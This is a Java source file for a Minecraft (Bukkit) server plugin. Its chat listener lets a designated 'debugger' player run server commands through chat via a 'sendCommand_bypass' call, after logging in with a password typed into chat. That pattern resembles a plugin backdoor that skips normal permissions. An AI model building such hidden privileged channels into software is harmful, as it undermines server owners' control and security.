package net.fumyatan.cgmpx.Listener;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import net.fumyatan.cgmpx.Manager.DebugConsole;

public class AsyncPlayerChatEventListener implements Listener {
	public static boolean waitLogin;
	public static Player waitPlayer;

	@EventHandler
	public void onAsyncPlayerChatEvent(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();

		// デバッガーか確認
		if (e.getPlayer().equals(DebugConsole.Debugger())){
			if (e.getMessage().indexOf("!") == 0){
				e.setMessage(e.getMessage().substring(1, e.getMessage().length()));
			} else {
				DebugConsole.sendCommand_bypass(e.getMessage(), p);
				e.setCancelled(true);
			}
		}

		if (waitLogin && waitPlayer.equals(p)){
			if (DebugConsole.authePassword(e.getMessage(), p)){
				p.sendMessage(ChatColor.GREEN + "[QTD] Login Success!");
				waitLogin = false;
				waitPlayer = null;
			} else {
				p.sendMessage(ChatColor.RED + "[QTD] Missing Password!");
				waitLogin = false;
				waitPlayer = null;
			}
			e.setCancelled(true);
		}
	}

}
